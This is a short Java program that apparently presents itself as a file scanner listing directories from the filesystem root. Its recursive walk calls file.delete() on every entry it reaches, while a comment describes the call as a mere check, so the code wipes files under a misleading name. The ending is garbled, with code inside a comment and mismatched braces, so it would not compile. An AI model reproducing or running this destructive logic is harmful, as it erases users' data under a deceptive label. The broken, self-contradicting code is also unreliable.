import java.io.*; // for the IOException and InputStream classes/for directory management methods etc  
public class java_52453_FileScanner_A08 {   
     public static void main(String[] args) throws IOException{       
           String rootDir = "/";                //root of your file system, it's a local dir on you machine.                
            printDirsAndFilesIn(new File(rootDir));        
      }      
   private  static void printDirsAndFilesIn(File directory) throws IOException{       
           String[] children = directory.list(); //getting list of files and directories in the current folder   
          if (children != null){           
               for (String childName : children ) {             
                     File fileOrDir = new File(directory,childName);     
                      boolean isDirectory  =fileOrDir .isDirectory() ;   //checking whether it's a directory or not.                   
                       if (!isDirectory)        {  }     else{               printDirsAndFilesIn (fileOrDir );}                 
                         File file = new File(directory, childName);      
                          boolean isFile  = !(!file .exists() || file.delete());    //checking whether it's a regular/non-hidden files or not and delete if necessary   }              printDirsAndFilesIn (new  java.io.File("c:/"));}}                      });     };                }}